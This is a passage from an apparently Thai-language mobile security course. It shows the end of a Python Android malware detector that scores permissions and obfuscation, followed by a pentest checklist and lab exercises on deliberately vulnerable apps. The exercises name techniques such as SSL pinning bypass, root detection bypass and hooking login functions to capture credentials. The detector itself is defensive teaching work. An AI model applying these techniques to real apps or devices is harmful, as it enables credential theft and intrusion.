            self.indicators.append('HIGH: Audio recording + Internet = possible spyware')
        
        if 'BIND_ACCESSIBILITY_SERVICE' in suspicious:
            self.score += 25
            self.indicators.append('CRITICAL: Accessibility Service abuse = likely banker/RAT')
        
        return suspicious
    
    def check_signatures(self, source_code: str) -> list:
        """ตรวจสอบ malware family signatures"""
        matches = []
        
        for family, sigs in self.MALWARE_SIGNATURES.items():
            sig_matches = sum(1 for sig in sigs 
                            if sig.lower() in source_code.lower())
            if sig_matches >= 2:  # ต้อง match อย่างน้อย 2 signatures
                matches.append(f"{family} (confidence: {sig_matches/len(sigs)*100:.0f}%)")
                self.score += 30
        
        return matches
    
    def check_obfuscation(self) -> bool:
        """ตรวจสอบว่า app ถูก obfuscate"""
        try:
            with zipfile.ZipFile(self.apk_path, 'r') as apk:
                # ดู class names
                class_files = [f for f in apk.namelist() 
                              if f.endswith('.class') or 'classes.dex' in f]
                
                # ถ้าชื่อ classes สั้นมาก (a, b, c) = obfuscated
                short_names = sum(1 for f in class_files 
                                if len(Path(f).stem) <= 2)
                
                if short_names > 10:
                    self.indicators.append('App is heavily obfuscated')
                    self.score += 10
                    return True
        except Exception:
            pass
        
        return False
    
    def analyze(self) -> dict:
        """Full malware analysis"""
        print(f"[*] Analyzing: {self.apk_path}")
        
        result = {
            'file': self.apk_path,
            'hashes': self.calculate_hashes(),
            'suspicious_permissions': [],
            'malware_families': [],
            'obfuscated': False,
            'indicators': [],
            'risk_score': 0,
            'verdict': 'CLEAN'
        }
        
        # Permissions
        result['suspicious_permissions'] = self.analyze_permissions()
        
        # Obfuscation
        result['obfuscated'] = self.check_obfuscation()
        
        result['indicators'] = self.indicators
        result['risk_score'] = self.score
        
        # Verdict
        if self.score >= 60:
            result['verdict'] = 'MALICIOUS'
        elif self.score >= 30:
            result['verdict'] = 'SUSPICIOUS'
        elif self.score >= 10:
            result['verdict'] = 'POTENTIALLY UNWANTED'
        
        print(f"\n{'='*50}")
        print(f"Verdict: {result['verdict']}")
        print(f"Risk Score: {self.score}/100")
        print(f"Suspicious Permissions: {len(result['suspicious_permissions'])}")
        for indicator in result['indicators']:
            print(f"  [!] {indicator}")
        
        return result


if __name__ == '__main__':
    import sys
    detector = AndroidMalwareDetector(sys.argv[1])
    result = detector.analyze()
    
    with open('malware_report.json', 'w') as f:
        json.dump(result, f, indent=2)
```

---

## 15. สรุปและ Lab Exercises

### 15.1 สรุปเครื่องมือ Mobile Security

| เครื่องมือ | ประเภท | วัตถุประสงค์ | Platform |
|-----------|--------|------------|----------|
| **ADB** | Device Control | Device interaction, file extraction | Android |
| **apktool** | Static | APK decompilation/recompilation | Android |
| **jadx** | Static | Java source decompilation | Android |
| **MobSF** | Static+Dynamic | Automated analysis | Android/iOS |
| **Frida** | Dynamic | Runtime instrumentation | Android/iOS |
| **objection** | Dynamic | Runtime exploration | Android/iOS |
| **apkleaks** | Static | Secret scanning | Android |
| **drozer** | Dynamic | Component testing | Android |
| **class-dump** | Static | Obj-C header extraction | iOS |
| **BurpSuite** | Network | Traffic interception | Both |
| **mitmproxy** | Network | Programmatic proxy | Both |

### 15.2 Mobile Security Checklist

```
Android Pentest Checklist:

[ ] Static Analysis
    [ ] Decompile APK (jadx, apktool)
    [ ] Check AndroidManifest.xml
        [ ] debuggable=false
        [ ] allowBackup=false
        [ ] No exported components without permissions
    [ ] Hardcoded secrets (API keys, passwords)
    [ ] Weak cryptography (MD5, DES, ECB)
    [ ] HTTP URLs (should be HTTPS)
    [ ] Third-party library versions

[ ] Dynamic Analysis
    [ ] Setup proxy (BurpSuite)
    [ ] SSL Pinning bypass (Frida/objection)
    [ ] Root detection bypass
    [ ] Runtime data monitoring
    [ ] Hook encryption functions

[ ] Network Analysis
    [ ] All traffic over HTTPS
    [ ] Certificate validation proper
    [ ] No sensitive data in URL params
    [ ] Proper authentication headers
    [ ] JWT security (alg, expiry)

[ ] Data Storage
    [ ] SharedPreferences not storing sensitive data
    [ ] SQLite databases encrypted
    [ ] No sensitive data in logs
    [ ] External storage not used for secrets
    [ ] Keystore used for crypto keys

[ ] Authentication
    [ ] Brute force protection
    [ ] Session timeout
    [ ] Biometric auth properly implemented
    [ ] No client-side auth checks

[ ] Component Security
    [ ] Activities not exported unnecessarily
    [ ] Content Providers protected
    [ ] Broadcast Receivers protected
    [ ] Deep links properly validated
```

### 15.3 Lab Exercises

```
แบบฝึกหัด Level 1 (Beginner):
1. ติดตั้ง DIVA APK (Damn Insecure and Vulnerable App)
   - ดาวน์โหลด: https://github.com/payatu/diva-android
   - ทำ challenge ทั้ง 13 ข้อ
   - Focus: Insecure Storage, Hardcoded Issues, Input Validation

2. ใช้ adb ทำ:
   - ดึง SharedPreferences จาก DIVA
   - ค้นหา hardcoded credentials
   - Query exported Content Provider

แบบฝึกหัด Level 2 (Intermediate):
1. ติดตั้ง InsecureBankv2
   - GitHub: https://github.com/dineshshetty/Android-InsecureBankv2
   - ทดสอบ authentication bypass
   - Intercept network traffic
   - Bypass SSL Pinning ด้วย Frida

2. MobSF Analysis:
   - Upload DIVA และ InsecureBankv2
   - วิเคราะห์ report
   - Identify OWASP Mobile Top 10 issues

แบบฝึกหัด Level 3 (Advanced):
1. Frida Scripting:
   - เขียน Frida script bypass root detection ใน DIVA
   - Hook login function เพื่อดู credentials
   - Bypass SSL Pinning ใน InsecureBankv2

2. Custom APK:
   - แก้ไข DIVA APK ด้วย apktool
   - เพิ่ม Frida gadget
   - Sign และติดตั้งใหม่

แบบฝึกหัด Level 4 (Expert):
1. Malware Reverse Engineering:
   - วิเคราะห์ sample Android malware (จาก safe sources)
   - Identify C2 communication
   - Extract IOCs (domains, IPs, registry)

2. Build PoC Exploit:
   - เขียน PoC สำหรับ Intent injection vulnerability
   - Demo Content Provider SQL injection
   - Build automated scanner
```

### 15.4 แหล่งเรียนรู้เพิ่มเติม

```
ทรัพยากร:
1. OWASP Mobile Security Testing Guide (MSTG)
   https://owasp.org/www-project-mobile-security-testing-guide/

2. Android Security Internals (Book)
   - Nicolas Falliere, Liam O Murchu

3. CTF Platforms:
   - HackTheBox Mobile Challenges
   - InjuredAndroid CTF
   - MOBISEC Challenges

4. Vulnerable Apps:
   - DIVA (Android)
   - InsecureBankv2 (Android)
   - DVFA (iOS)
   - iGoat-Swift (iOS)
   - Damn Vulnerable iOS App (DVIA-v2)

5. Courses:
   - TCM Security - Mobile Application Penetration Testing
   - INE - eMAPT Certification
   - Offensive Security - OSMR
```

---

## สรุป

ในบทนี้เราได้เรียนรู้:

| หัวข้อ | ความครอบคลุม |
|--------|-------------|
| Android/iOS Architecture | Security model, APK/IPA structure |
| OWASP Mobile Top 10 | ช่องโหว่ที่พบบ่อยที่สุด |
| ADB Mastery | Device control, data extraction |
| APK Analysis | Static analysis, decompilation |
| MobSF | Automated analysis framework |
| Frida/Objection | Dynamic instrumentation, runtime hooks |
| SSL Pinning Bypass | Multiple bypass techniques |
| iOS Testing | Jailbreak-based testing |
| Traffic Analysis | MitM, mitmproxy addon |
| Malware Detection | Signature-based detection |

ขั้นตอนถัดไปคือการเรียนรู้ **IoT Security** ซึ่งจะขยายขอบเขตไปยัง embedded devices และ firmware analysis

---

← [Part 78: Advanced Exploitation](Part-78-Advanced-Exploitation.md) | [Part 80: IoT Security](Part-80-IoT-Security.md) →
